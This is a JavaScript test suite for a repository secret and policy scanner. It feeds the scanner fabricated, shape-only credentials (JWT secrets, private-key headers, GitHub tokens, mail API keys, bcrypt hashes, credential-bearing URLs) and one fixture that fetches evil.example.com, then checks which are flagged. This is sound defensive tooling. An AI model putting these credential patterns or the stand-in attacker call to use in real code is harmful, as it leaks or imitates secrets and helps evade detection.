test('C3-OUT-ROUTE: /credits 는 사진 0이어도 존재 가능(R4 D6), 단 indexable 이면 실패', async () => {
  const mk = (indexable) => makeRoot({
    output: (o) => { o['credits/index.html'] = o['index.html']; },
    manifest: (dg) => {
      const m = manifestFor(dg);
      m.routes.push({ path: '/credits', file: 'credits/index.html', kind: 'CREDITS', indexable });
      return m;
    },
  });
  expectClean(scan(await mk(false)));
  expectFail(scan(await mk(true)), 'C3-OUT-ROUTE');
});

// D1(Q1): credits 링크 규칙은 manifest 라우트 파일에만 — SPA 셸·비라우트 HTML 제외.
function creditsFixture({ dropLinkFrom = null } = {}) {
  return {
    seed: (d) => { d['photos.json'].push(ccByPhoto()); },
    output: (o) => {
      for (const k of Object.keys(o)) if (k.endsWith('.html') && k !== dropLinkFrom) o[k] = o[k].replace('</footer>', '<a href="/credits">사진 출처</a></footer>');
      o['credits/index.html'] = creditsPage(o);
      o['404.html'] = o['index.html'];
      o['shell.html'] = '<!doctype html><html lang="ko"><head><title>WithSmall</title></head><body><div id="root"></div><script type="module" src="/assets/index-abc.js"></script></body></html>';
    },
    manifest: (dg) => {
      const m = manifestFor(dg);
      m.routes.push({ path: '/credits', file: 'credits/index.html', kind: 'CREDITS', indexable: false });
      m.routes.push({ path: '/404', file: '404.html', kind: 'NOT_FOUND', indexable: false });
      return m;
    },
  };
}

test('C6-IMG: CC_BY 사진 + 링크 없는 shell.html(비라우트) → 통과', async () => {
  expectClean(scan(await makeRoot(creditsFixture())));
});

test('C6-IMG: CC_BY 사진 + manifest 라우트 페이지(404 포함)에 링크 없음 → 실패', async () => {
  expectFail(scan(await makeRoot(creditsFixture({ dropLinkFrom: 'hamster/golden/index.html' }))), 'C6-IMG');
  const res = scan(await makeRoot((() => {
    const f = creditsFixture();
    const out = f.output;
    f.output = (o) => { out(o); o['404.html'] = o['404.html'].replace('<a href="/credits">사진 출처</a>', ''); };
    return f;
  })()));
  expectFail(res, 'C6-IMG');
});

// D3(Q1): 자산 경로는 TS P05/T03 과 같은 정규식.
test('C1-SEEDURL: imageAsset·reviewerImage 가 /assets/products|reviewers/<kebab>.(webp…) 밖', async () => {
  const bad = j('/assets/x/', 'Y.svg');
  expectFail(scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].imageAsset = bad; } })), 'C1-SEEDURL');
  expectFail(scan(await makeRoot({ seed: (d) => { Object.assign(d['testimonials.json'][0], { reviewerImage: bad, reviewerImageConsent: true }); } })), 'C1-SEEDURL');
  expectFail(scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].imageAsset = '/assets/products/Cp-001.webp'; } })), 'C1-SEEDURL');
  expectFail(scan(await makeRoot({ seed: (d) => { d['curated-products.json'][0].imageAsset = '/assets/reviewers/cp-001.webp'; } })), 'C1-SEEDURL');
});

// ── C7 시크릿 ───────────────────────────────────────────────
test('C7-SECRET: 하드코딩 JWT 시크릿', async () => {
  const src = j('const ', 'JWT_', 'SECRET = "', 'abcdefghijklmnopqrstu', '";\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['server/src/s.ts'] = src; } })), 'C7-SECRET');
});

test('C7-SECRET: 주석 속 PEM 헤더도 실패', async () => {
  const src = j('// -----BEGIN ', 'PRIVATE KEY-----\n');
  expectFail(scan(await makeRoot({ source: (s) => { s['scripts/k.mjs'] = src; } })), 'C7-SECRET');
});

test('C7-SECRET: deploy/ 의 셸 스크립트·확장자 없는 Caddyfile 도 검사(예시 *.example 은 제외)', async () => {
  const pem = j('# -----BEGIN ', 'OPENSSH PRIVATE KEY-----\n');
  for (const f of ['deploy/deploy.sh', 'deploy/Caddyfile', 'deploy/compose.yaml']) {
    expectFail(scan(await makeRoot({ source: (s) => { s[f] = pem; } })), 'C7-SECRET');
  }
  const res = scan(await makeRoot({ source: (s) => { s['deploy/server.env.example'] = pem; } }));
  assert.equal(res.json.findings.filter((x) => x.rule === 'C7-SECRET').length, 0);
});

test('C7-SECRET: git 추적 .env', async () => {
  const root = await makeRoot();
  writeFileSync(join(root, 'server', '.env'), 'X=1\n');
  writeFileSync(join(root, 'server', '.env.example'), 'X=\n');
  execFileSync('git', ['init', '-q'], { cwd: root });
  execFileSync('git', ['add', '-f', 'server/.env', 'server/.env.example'], { cwd: root });
  const res = scan(root);
  expectFail(res, 'C7-SECRET');
  assert.equal(res.json.findings.filter((f) => f.rule === 'C7-SECRET').length, 1);
});

// ── C7 시크릿 — 배포 실값 형태(security 139 MED-1) ──────────────
//   위반 문자열은 전부 j(...)로 조립(이 파일도 실트리 스캔 대상). 값은 형태만 맞춘 가짜.
const HEX64 = 'a1b2c3d4'.repeat(8);
const GH36 = 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';
const RESEND = j('re', '_', 'Ab3dEf9h', '_', 'KxYz12QwErTy56UiOp78AsDf');
const BCRYPT = j('$', '2a', '$', '14', '$', 'abcdefghijklmnopqrstuvABCDEFGHIJKLMNOPQRSTUVWXYZ01234'.slice(0, 53));
const c7Count = (res) => res.json.findings.filter((f) => f.rule === 'C7-SECRET' && f.severity === 'FAIL').length;

test('C7-SECRET MED-1: 따옴표 없는 env 값·export·YAML 목록·GitHub 토큰·Resend 키·bcrypt 해시 → FAIL', async () => {
  const cases = [
    ['deploy/compose.yaml', j('JWT_ACCESS', '_SECRET=', HEX64, '\n')],
    ['deploy/deploy.sh', j('export REACTION_KEY', '_SECRET=', HEX64, '\n')],
    ['deploy/compose.yaml', j('    environment:\n      - JWT_REFRESH', '_SECRET=', HEX64, '\n')],
    ['scripts/tool.mjs', j('// token ', 'gh', 'p_', GH36, '\n')],
    ['deploy/Caddyfile', j('# ', 'gh', 's_', GH36, '\n')],
    ['scripts/tool.mjs', j("const t = '", 'github', '_pat_', '11ABCDEFG0123456789abc', '_', 'x'.repeat(10), 'Y'.repeat(30), 'z9'.repeat(10), "';\n")],
    ['server/src/mail.ts', j("const key = '", RESEND, "';\n")],
    ['deploy/deploy.sh', j('MAIL_KEY=', RESEND, '\n')],
    ['deploy/Caddyfile', j('\tbasic_auth {\n\t\tkenny ', BCRYPT, '\n\t}\n')],
    ['deploy/deploy.sh', j("WS_BASIC", "_HASH='", BCRYPT, "'\n")],
    ['.github/workflows/x.yml', j('        env:\n          GH_DEPLOY', '_TOKEN=', GH36, '\n')],
  ];
  for (const [f, text] of cases) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    expectFail(res, 'C7-SECRET');
    assert.ok(res.json.findings.some((x) => x.rule === 'C7-SECRET' && x.file === f), `${f}: ${JSON.stringify(text)}`);
  }
});

test('C7-SECRET MED-1: 오탐 없음 — 자리표시·변수·치환·secrets 식·짧은 값·스네이크 식별자·예시 파일·테스트 픽스처', async () => {
  const clean = [
    ['deploy/compose.yaml', j('JWT_ACCESS', '_SECRET=__SET_ME__\nWS_BASIC', "_HASH='__SET_ME__'\n")],
    ['deploy/deploy.sh', j('JWT_ACCESS', '_SECRET="$(openssl rand -hex 32)"\nREACTION_KEY', '_SECRET="$REACTION_KEY', '_SECRET"\n')],
    ['.github/workflows/x.yml', j('          JWT_ACCESS', '_SECRET="$(openssl rand -hex 32)"\n          GH_TOKEN: ${{ github.token }}\n          password: ${{ secrets.GITHUB', '_TOKEN }}\n')],
    ['deploy/Caddyfile', j('\tbasic_auth {\n\t\t{$WS_BASIC_USER} {$WS_BASIC', '_HASH}\n\t}\n')],
    ['deploy/deploy.sh', j("WS_BASIC", "_HASH='<해시>'\nAPI", '_TOKEN=${API', '_TOKEN:-}\n')],
    ['server/src/config/env.ts', j('  JWT_ACCESS', '_SECRET: z.string().min(32),\n  const re_validate_inputvalues_and_more = 1;\n')],
    ['scripts/tool.mjs', j("const re_compute_value = 're_', 'ab_cd';\nconst x = 'ghp_short';\n")],
    // 코드 안 bcrypt 더미 해시(타이밍 균등화 — user.repo.ts DUMMY_PASSWORD_HASH)는 시크릿이 아니다(bcrypt 규칙은 코드가 아닌 파일만).
    ['server/src/auth/dummy.ts', j("export const DUMMY_PASSWORD_HASH = '", BCRYPT, "';\n")],
    ['server/src/__tests__/hardening.test.ts', j("await ", FETCH, "('", HTTPS, "evil.example.com/x');\nconst PASSWORD_HINT = 'x';\n")],
  ];
  for (const [f, text] of clean) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.equal(c7Count(res), 0, `${f}: ${JSON.stringify(res.json.findings.filter((x) => x.rule === 'C7-SECRET'))}`);
  }
  // 예시 파일은 값이 있어도 건너뛴다(값 0 은 deploy-config.test.mjs 가 본다).
  const ex = scan(await makeRoot({ source: (s) => { s['deploy/server.env.example'] = j('JWT_ACCESS', '_SECRET=', HEX64, '\n'); } }));
  assert.equal(c7Count(ex), 0);
});

test('C7-SECRET MED-1: deploy/*.env 실값 파일은 작업 트리에 있기만 해도 FAIL(추적 여부 무관), *.env.example 은 통과', async () => {
  for (const f of ['deploy/server.env', 'deploy/caddy.env', 'deploy/sub/x.env']) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = 'NODE_ENV=production\n'; } }));
    expectFail(res, 'C7-SECRET');
    assert.ok(res.json.findings.some((x) => x.rule === 'C7-SECRET' && x.file === f && /배포 실값 env/.test(x.message)), f);
  }
  const ok = scan(await makeRoot({ source: (s) => { s['deploy/server.env.example'] = 'NODE_ENV=production\n'; s['deploy/deploy.conf.example'] = 'WS_IMAGE_REPO=\n'; } }));
  assert.equal(c7Count(ok), 0);
});

test('C7-SECRET MED-1: git 추적 *.env(점으로 시작하지 않는 server.env·prod.env.local 도), 예시는 제외', async () => {
  const root = await makeRoot();
  mkdirSync(join(root, 'config'), { recursive: true });
  writeFileSync(join(root, 'config', 'server.env'), 'X=1\n');
  writeFileSync(join(root, 'config', 'prod.env.local'), 'X=1\n');
  writeFileSync(join(root, 'config', 'server.env.example'), 'X=\n');
  writeFileSync(join(root, 'config', 'environment.ts'), 'export const x = 1;\n');
  writeFileSync(join(root, 'config', 'config.env.test.ts'), 'export const x = 1;\n');
  writeFileSync(join(root, 'config', 'x.env.json'), '{}\n');
  execFileSync('git', ['init', '-q'], { cwd: root });
  execFileSync('git', ['add', '-f', 'config/server.env', 'config/prod.env.local', 'config/server.env.example', 'config/environment.ts', 'config/config.env.test.ts', 'config/x.env.json'], { cwd: root });
  const res = scan(root);
  expectFail(res, 'C7-SECRET');
  const files = res.json.findings.filter((f) => f.rule === 'C7-SECRET').map((f) => f.file).sort();
  assert.deepEqual(files, ['config/prod.env.local', 'config/server.env']);
});

test('C7-SECRET QA148 LOW-1: 낱말로 시작하는 이름·YAML 맵·Dockerfile ENV/ARG·값 안의 $ → FAIL', async () => {
  const cases = [
    ['deploy/deploy.sh', j('PASS', 'WORD=', HEX64, '\n')],
    ['deploy/deploy.sh', j('TOK', 'EN=', HEX64, '\n')],
    ['deploy/deploy.sh', j('SECRET', '_KEY_BASE=', HEX64, '\n')],
    ['deploy/deploy.sh', j('API', '_KEY=', HEX64, '\n')],
    ['deploy/deploy.sh', j('DEPLOY_PASS', 'WORD=Sup3r$3cretValue99xQ\n')],
    ['deploy/compose.yaml', j('    environment:\n      JWT_ACCESS', '_SECRET: ', HEX64, '\n')],
    ['deploy/compose.yaml', j('    environment:\n      JWT_ACCESS', "_SECRET: '", HEX64, "'\n")],
    ['.github/workflows/x.yml', j('        env:\n          DEPLOY', '_TOKEN: ', GH36, '\n')],
    ['Dockerfile', j('FROM node:22-alpine\nENV JWT_ACCESS', '_SECRET=', HEX64, '\n')],
    ['Dockerfile', j('FROM node:22-alpine\nENV API', '_TOKEN ', HEX64, '\n')],
    ['Dockerfile', j('FROM node:22-alpine\nARG DEPLOY_PASS', 'WORD=', HEX64, '\n')],
  ];
  for (const [f, text] of cases) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.ok(res.json.findings.some((x) => x.rule === 'C7-SECRET' && x.file === f), `${f}: ${JSON.stringify(text)}`);
  }
  const clean = [
    // 코드 객체 리터럴 KEY: 식(콜론 형태는 코드 파일에 적용하지 않는다).
    ['server/src/config/env2.ts', j('  JWT_ACCESS', '_SECRET: process.env.JWT_ACCESS_SECRET_VALUE_LONG,\n')],
    ['.github/workflows/x.yml', j('          GH', '_TOKEN: ${{ github.token }}\n          API', '_TOKEN: <토큰>\n')],
    ['deploy/compose.yaml', j('    environment:\n      - SQLITE_TMPDIR=/data/.sqlite-tmp\n      JWT_ACCESS', '_SECRET: ${JWT_ACCESS', '_SECRET}\n')],
    ['Dockerfile', j('FROM node:22-alpine\nARG VITE_NAVER_MAP_CLIENT_ID=\nENV SECRET', '_FILE /run/s\nARG API', '_TOKEN\n')],
    ['deploy/deploy.sh', j('TOK', 'EN="$(cat /run/secrets/token_file_path)"\nPASS', 'WORD=$DEPLOY_PASSWORD_FROM_ENV\n')],
  ];
  for (const [f, text] of clean) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.equal(c7Count(res), 0, `${f}: ${JSON.stringify(res.json.findings.filter((x) => x.rule === 'C7-SECRET'))}`);
  }
});

test('C7-SECRET 150 LOW-2: 루트 *.sh·.github 전체 스캔, _KEY 이름·URL 자격 증명(코드 아닌 파일) → FAIL, 자리·변수·코드는 통과', async () => {
  const cases = [
    ['docker-entrypoint.sh', j('export SIGNING', '_KEY=', HEX64, '\n')],
    ['.github/dependabot.yml', j('registries:\n  x:\n    ENCRYPTION', '_KEY: ', HEX64, '\n')],
    ['.github/scripts/x.sh', j('DEPLOY', '_KEY=', HEX64, '\n')],
    ['.github/CODEOWNERS', j('# ', 'gh', 'p_', GH36, '\n')],
    ['deploy/compose.yaml', j('      - DATABASE_URL=postgres://ws:', 'S3cretPassw0rd', '@db:5432/ws\n')],
    ['scripts/dev/pull.sh', j('git clone ', HTTPS, 'kenny:', 'Zx9TokenValueQ', '@git.example.org/r.git\n')],
  ];
  for (const [f, text] of cases) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.ok(res.json.findings.some((x) => x.rule === 'C7-SECRET' && x.file === f), `${f}: ${JSON.stringify(text)}`);
  }
  const clean = [
    ['.github/workflows/x.yml', j('          DEPLOY_SSH', '_KEY: ${{ secrets.DEPLOY_SSH', '_KEY }}\n          key: playwright-${{ runner.os }}-lock\n')],
    ['deploy/deploy.sh', j('URL=', HTTPS, '<user>:<token>@host/x\nU2=', HTTPS, 'user@host/x\nDB=postgres://${DB_USER}:${DB_PASS}@db/ws\n')],
    ['docker-entrypoint.sh', j('CACHE', '_KEY=short\nexport SSH_PUBLIC', '_KEY="$(cat /k.pub)"\n')],
    // 코드 파일: _KEY 상수·URL 자격 증명 형태는 코드 아닌 파일 규칙이라 적용하지 않는다(코드 문자열 검사는 기존 규칙 몫).
    ['server/src/k.ts', j('export const STORAGE', '_KEY = "ws.state.v1.something-long";\n')],
  ];
  for (const [f, text] of clean) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.equal(c7Count(res), 0, `${f}: ${JSON.stringify(res.json.findings.filter((x) => x.rule === 'C7-SECRET'))}`);
  }
});

// ── C7 시크릿 — QA152 INFO-3(①docs ②소문자·JSON 키 ③짧은 값 WARN ④_KEY_B64 ⑤URL 대문자 스킴·$) ──
const c7Of = (res, f, sev) => res.json.findings.some((x) => x.rule === 'C7-SECRET' && x.file === f && x.severity === sev);

test('C7-SECRET QA152 INFO-3: docs 스캔·소문자/JSON 키·_KEY_B64·URL 대문자 스킴/비밀번호 속 $ → FAIL', async () => {
  const cases = [
    // ① docs/ — 줄 시작 env·md 인라인·JSON
    ['docs/ops/x.md', j('JWT_ACCESS', '_SECRET=', HEX64, '\n')],
    ['docs/ops/x.md', j('설정: `secret', '_token=', HEX64, '` 을 넣는다\n')],
    ['docs/design/x.json', j('{\n  "api', '_key": "', HEX64, '"\n}\n')],
    // ② 소문자·camel·JSON 키(코드 아닌 파일)
    ['.github/scripts/x.sh', j('secret', '_token=', HEX64, '\n')],
    ['deploy/compose.yaml', j('    environment:\n      access', 'Token: ', HEX64, '\n')],
    ['deploy/x.json', j('{"client', '_secret":"', HEX64, '"}\n')],
    //   코드 파일의 JSON 키 형태 "api_key": "…"(기존 api 키 규칙이 닫는 따옴표를 허용)
    ['scripts/tool.mjs', j('const c = { "api', '_key": "', HEX64, '" };\n')],
    // ④ _KEY 뒤 인코딩 접미사(이름에 SECRET·TOKEN·SIGNING_KEY 같은 낱말이 없어 ②가 잡지 않는 이름으로)
    ['docker-entrypoint.sh', j('export WEBHOOK', '_KEY_B64=', HEX64, '\n')],
    ['.github/x.yml', j('        env:\n          DEPLOY', '_KEY_HEX: ', HEX64, '\n')],
    // ⑤ URL 자격 증명 — 대문자 스킴·비밀번호 중간의 $
    ['deploy/deploy.sh', j('URL=', HTTPS.toUpperCase(), 'kenny:', 'Zx9TokenValueQ', '@git.example.org/r.git\n')],
    ['deploy/compose.yaml', j('      - DATABASE_URL=postgres://ws:', 'Pa$$w0rd', '$99@db:5432/ws\n')],
  ];
  for (const [f, text] of cases) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.ok(c7Of(res, f, 'FAIL'), `${f}: ${JSON.stringify(text)} → ${JSON.stringify(res.json.findings.filter((x) => x.rule === 'C7-SECRET'))}`);
  }
});

test('C7-SECRET QA152 INFO-3: 시크릿 이름의 8~15자 리터럴(글자+숫자) → WARN 만(FAIL 아님)', async () => {
  const cases = [
    ['deploy/deploy.sh', j('secret', '_token=', 'Ab3dEf9h12', '\n')],
    ['docs/ops/x.md', j('`API', '_TOKEN=', 'Zx9Q2w8E', '`\n')],
    ['.github/x.yml', j('          pass', 'word: ', 'hunter2hunter2', '\n')],
  ];
  for (const [f, text] of cases) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    assert.ok(c7Of(res, f, 'WARN'), `${f}: ${JSON.stringify(text)}`);
    assert.equal(c7Count(res), 0, `${f}: ${JSON.stringify(res.json.findings.filter((x) => x.rule === 'C7-SECRET'))}`);
  }
});

test('C7-SECRET QA152 INFO-3: 오탐 없음 — docs 자리표시·예시 값·변수·_KEY_PATH·tokens 낱말·산문·글자만 값·코드 파일', async () => {
  const clean = [
    ['docs/ops/x.md', j('JWT_ACCESS', '_SECRET=<openssl rand -hex 32>\n')],
    ['docs/ops/x.md', j('`-e WS_BASIC', "_HASH='<아무 bcrypt>'` · `RESEND_API", '_KEY=__SET_ME__` · `secret', '_token=${SECRET_TOKEN}`\n')],
    ['docs/ops/x.md', j('api', '_key: your-api-key-here-123\n"token": "', 'x'.repeat(24), '"\npass', 'word: ***\n')],
    ['docs/ops/x.md', j('token=example-token-1234567890\nclient', '_secret: dummy-secret-0123456789\nsigning', '_key: <서명 키 base64>\n')],
    ['docs/ops/x.md', j('- 토큰: 운영자가 주입한다(커밋 금지). secret', '_token 은 15분 단일 사용.\n')],
    ['docs/design/tokens.json', j('{\n  "tokens": [ "abc123def456ghi789jkl" ],\n  "tokenCount": "abc123def456ghi789"\n}\n')],
    ['.github/x.yml', j('          pass', 'word: ${{ secrets.DEPLOY_PASS', 'WORD }}\n          secret', '_token: $SECRET_TOKEN_FROM_ENV_1\n')],
    ['deploy/deploy.sh', j('SSH', '_KEY_PATH=/home/deploy/.ssh/id_ed25519\nCACHE', '_KEY_PREFIX=ws-cache-v1-abcdefgh\nSSH', '_KEY_FILE=/run/secrets/deploy_key_2\n')],
    ['deploy/deploy.sh', j('secret', '_token=short\npass', 'word=abcdefghijklmnopqrst\n')],
    ['deploy/deploy.sh', j('U=', HTTPS.toUpperCase(), '<user>:<token>@host/x\nDB=postgres://ws:${DB_PASS}@db/ws\nD2=postgres://ws:$DB_PASS@db/ws\n')],
    // 코드 파일: 소문자 키=값 규칙은 코드 아닌 파일만(테스트 픽스처의 token: '…' 오탐 방지 — 코드 문자열은 기존 규칙 몫).
    ['server/src/k.ts', j("const accessToken = 'abc123def456ghi789jkl';\nconst o = { pass", "word: 'abc123def456ghi789' };\n")],
  ];
  for (const [f, text] of clean) {
    const res = scan(await makeRoot({ source: (s) => { s[f] = text; } }));
    const c7 = res.json.findings.filter((x) => x.rule === 'C7-SECRET');
    assert.equal(c7.length, 0, `${f}: ${JSON.stringify(text)} → ${JSON.stringify(c7)}`);
  }
});

// ── C7 시크릿 — QA198(LOW-2 이름 뒷부분·값 형태 오탐, LOW-1 키·설정 확장자, INFO-1 긴 줄 시간, INFO-2 docs 코드 파일) ──
const c7All = (res, f) => res.json.findings.filter((x) => x.rule === 'C7-SECRET' && (!f || x.file === f));

test('C7-SECRET QA198 LOW-2: 주소·경로·식별자 이름(_url·_endpoint·_file·_path·_id·_name·_hash)·경로/URL 값 → FAIL·WARN 0', async () => {
  const fp = [
    j('token', '_url=', HTTPS, 'nid.naver.com/oauth2.0/token'),
    j('token', '_endpoint: ', HTTPS, 'oauth2.googleapis.com/token'),
    j('pass', 'word_file: /run/secrets/db_password_v2'),
    j('secret', '_path: /run/secrets/deploy_key_2'),
    j('signing', '_key_id: kid-2026-10-01-a'),
    j('secret', '_name: ws-jwt-access-2026'),
    j('token', '_hash: 3f2a9c1b7e8d4a6f'),
    // 이름은 그대로 시크릿 낱말이어도 값이 경로·자격 증명 없는 URL 이면 제외
    j('client', '_secret=./run/secrets/naver_client_2'),
    j('api', '_token: ', HTTPS, 'api.example.org/v2/token'),
  ].join('\n');
  const root = await makeRoot({ source: (s) => { s['docs/ops/oauth.md'] = `${fp}\n`; s['deploy/oauth.yml'] = `${fp}\n`; } });
  const res = scan(root);
  assert.deepEqual(c7All(res), [], JSON.stringify(c7All(res)));
  expectClean(res);
});

test('C7-SECRET QA198 LOW-2: 제외 뒤에도 잡힘 — URL 질의 속 access_token·_url 이름의 userinfo 토큰·/ 로 시작하는 base64·기존 양성', async () => {
  const B64 = j('/Ab3dEf9h12Kx7Yz', '34QwErTy+9', 'Lm0Np=');
  const cases = [
    j('token', '_url=', HTTPS, 'login.corp-internal.org/cb?access', '_token=', HEX64),
    j('token', '_url=', HTTPS, 'Ab3dEf9h12Kx7Yz34QwErTy', '@git.corp-internal.org/r.git'),
    j('secret', '_token=', B64),
    // + 와 = 가 없어 경로 글자만인 base64 — 무작위 마디(대·소문자·숫자 16자 이상)라 경로로 보지 않는다
    j('secret', '_token=/Ab3dEf9h12Kx7Yz', '34QwErTyLm0Np9Qr'),
    j('secret', '_token=', HEX64),
    j('id', '_token: eyJ0eXAi0iJKV1Qi', '1234567890ab'),
  ];
  const src = {};
  cases.forEach((c, i) => { src[`docs/ops/p${i}.md`] = `${c}\n`; });
  const res = scan(await makeRoot({ source: (s) => Object.assign(s, src) }));
  for (const [i, c] of cases.entries()) assert.ok(c7Of(res, `docs/ops/p${i}.md`, 'FAIL'), `${c} → ${JSON.stringify(c7All(res, `docs/ops/p${i}.md`))}`);
});

const KEY_CONFIG_FILES = ['docs/k.pem', 'deploy/x.key', 'deploy/site.crt', 'deploy/app.toml', 'app.ini', 'deploy/app.conf', 'deploy/app.cfg', 'deploy/my.cnf', 'deploy/app.properties', 'docs/a.tf', 'deploy/prod.tfvars'];

test('C7-SECRET QA198 LOW-1: 키·설정 확장자(.pem .key .crt .toml .ini .conf .cfg .cnf .properties .tf .tfvars) — 개인 키 헤더·secret_token= → FAIL', async () => {
  const keyRoot = await makeRoot({ source: (s) => { for (const f of KEY_CONFIG_FILES) s[f] = j('-----BEGIN OPENSSH PRI', 'VATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n'); } });
  const kv = j('secret', '_token = abc123def456ghi789jk\n');
  const kvRoot = await makeRoot({ source: (s) => { for (const f of KEY_CONFIG_FILES) s[f] = kv; } });
  for (const root of [keyRoot, kvRoot]) {
    const res = scan(root);
    for (const f of KEY_CONFIG_FILES) assert.ok(c7Of(res, f, 'FAIL'), `${f}: ${JSON.stringify(c7All(res, f))}`);
  }
});

test('C7-SECRET QA198 LOW-1: 키·설정 확장자는 C7 만 — 외부 URL·평범한 설정은 FAIL·WARN 0(migration_lock.toml 형태 포함)', async () => {
  const text = j('# x\nprovider = "sqlite"\nendpoint = "', HTTPS, 'cdn.example.org/a.js"\n[server]\nport = 8080\n');
  const res = scan(await makeRoot({ source: (s) => { for (const f of [...KEY_CONFIG_FILES, 'server/prisma/migrations/migration_lock.toml', 'scripts/x.toml']) s[f] = text; } }));
  expectClean(res);
  assert.deepEqual(res.json.findings.filter((x) => x.severity !== 'INFO'), [], JSON.stringify(res.json.findings));
});

test('C7-SECRET QA198 INFO-1: 긴 한 줄(이름 글자 140KB 런) — 줄마다 1초 안, 줄 끝 시크릿은 계속 잡힘', async () => {
  const { c7LineHits } = await import('../lib/rules-source.mjs');
  const runs = [
    'secret_'.repeat(20000),
    'x-token'.repeat(20000),
    'TOKEN_'.repeat(20000),
    j('EN', 'V ', 'TOKEN_'.repeat(20000)),
    'JWT_'.repeat(30000),
    'api_'.repeat(30000),
  ];
  for (const r of runs) {
    for (const isCode of [false, true]) {
      const t = process.hrtime.bigint();
      c7LineHits(r, isCode);
      const ms = Number(process.hrtime.bigint() - t) / 1e6;
      assert.ok(ms < 1000, `${r.slice(0, 14)}… isCode=${isCode}: ${ms.toFixed(0)}ms`);
    }
  }
  // 줄 길이로 건너뛰지 않는다 — 긴 한 줄 JSON 끝의 시크릿도 FAIL.
  const longJson = j('{"pad":"', 'a '.repeat(70000), '","client', '_secret":"', HEX64, '"}');
  assert.ok(c7LineHits(longJson, false).some((h) => h.severity === 'FAIL'));
});

test('C7 QA198 INFO-2: docs/ 아래 코드 파일(.ts·.mjs)은 C7 만 — 코드 규칙(C1 외부 fetch·수집 라이브러리)을 타지 않는다', async () => {
  const code = j("import x from 'pupp", "eteer';\nawait ", FETCH, "('", HTTPS, "cdn.example.org/a.json');\n");
  const res = scan(await makeRoot({ source: (s) => { s['docs/snippets/x.ts'] = code; s['docs/snippets/y.mjs'] = code; } }));
  expectClean(res);
  assert.deepEqual(res.json.findings.filter((x) => (x.file ?? '').startsWith('docs/')), []);
  // 같은 내용이 코드 디렉터리에 있으면 잡힌다(픽스처가 실제로 코드 규칙에 걸리는 내용임을 고정).
  const ctl = scan(await makeRoot({ source: (s) => { s['scripts/snip.mjs'] = code; } }));
  expectFail(ctl, 'C1-FETCH');
});

// ── C7 시크릿 — 201(Codex 200: MED-1 메타데이터 이름 오탐, 요청3 이름 제외의 값 형태, MED-2 JSON 표현 우회, MED-3 긴 줄 시간, 대소문자 섞인 이름) ──
const RND = j('Ab3dEf9h12', 'Kx7Yz34QwErTy'); // 합성 무작위형 값(23자, 대·소문자·숫자)
const kvSev = async (line) => (await import('../lib/rules-source.mjs')).c7LineHits(line, false).map((h) => h.severity);

test('C7-SECRET 201 MED-1: 메타데이터 이름 끝(_audience·_algorithm·_issuer·_scope·_policy·_rounds·_cost·_min·_max·_expiry·_expires·_lifetime·_aud·_alg·_iss) → FAIL·WARN 0', async () => {
  const fp = [
    j('token', '_audience="withsmall-api-v1"'),
    j('password', '_algorithm="pbkdf2-hmac-sha256"'),
    j('token', '_issuer: ', HTTPS, 'auth.withsmall.kr/v1'),
    j('token', '_iss: withsmall-auth-2026'),
    j('token', '_aud: withsmall-api-v1'),
    j('jwt_secret', '_alg: hmac-sha256-v2026a'),
    j('token', '_scope: read:catalog-v2'),
    j('password', '_policy: min12-upper1-digit1'),
    j('password', '_rounds: 310000-sha256'),
    j('password', '_cost: bcrypt-cost-12x'),
    j('password', '_min: length-12-chars'),
    j('password', '_max: length-128-chars'),
    j('token', '_expiry: 2026-10-01T00:00:00Z'),
    j('token', '_expires: 2026-10-01T00:00:00Z'),
    j('session_token', '_lifetime: 15m-sliding-90d'),
  ];
  for (const l of fp) assert.deepEqual(await kvSev(l), [], l);
  const res = scan(await makeRoot({ source: (s) => { s['docs/ops/meta.md'] = `${fp.join('\n')}\n`; s['deploy/meta.yml'] = `${fp.join('\n')}\n`; } }));
  assert.deepEqual(c7All(res), [], JSON.stringify(c7All(res)));
  // 이름 끝 '구분자 뒤'만 — 메타데이터 낱말이 이름 중간이면 그대로 본다.
  assert.deepEqual(await kvSev(j('token', '_audience_secret=', RND)), ['FAIL']);
});

test('C7-SECRET 201 요청3: 이름 끝 제외는 값이 무작위형이면 적용하지 않음 — token_id·token_url·token_path·_audience=<무작위> → FAIL, 198 음성 7줄은 계속 0', async () => {
  for (const name of ['token_id', 'token_url', 'token_path', 'token_name', 'token_hash', 'token_audience', 'password_algorithm', 'secret_header']) {
    assert.deepEqual(await kvSev(j(name, '=', RND)), ['FAIL'], name);
  }
  assert.deepEqual(await kvSev(j('signing', '_key_id: ', RND)), ['FAIL']);
  const neg = [
    j('token', '_url=', HTTPS, 'nid.naver.com/oauth2.0/token'),
    j('token', '_endpoint: ', HTTPS, 'oauth2.googleapis.com/token'),
    j('pass', 'word_file: /run/secrets/db_password_v2'),
    j('secret', '_path: /run/secrets/deploy_key_2'),
    j('signing', '_key_id: kid-2026-10-01-a'),
    j('secret', '_name: ws-jwt-access-2026'),
    j('token', '_hash: 3f2a9c1b7e8d4a6f'),
  ];
  for (const l of neg) assert.deepEqual(await kvSev(l), [], l);
});

test('C7-SECRET 201: 대소문자 섞인 이름(aPi_KeY·ToKeN·cLiEnT_SeCrEt) → FAIL, 낱말 경계는 그대로(tokens·passwordless·tokenCount 0)', async () => {
  for (const name of ['aPi_KeY', 'ToKeN', 'cLiEnT_SeCrEt', 'accessTOKen', 'PassWord']) assert.deepEqual(await kvSev(j(name, '=', RND)), ['FAIL'], name);
  for (const name of ['ToKeNs', 'passWordless', 'tokenCount', 'mytoken']) assert.deepEqual(await kvSev(j(name, '=', RND)), [], name);
});

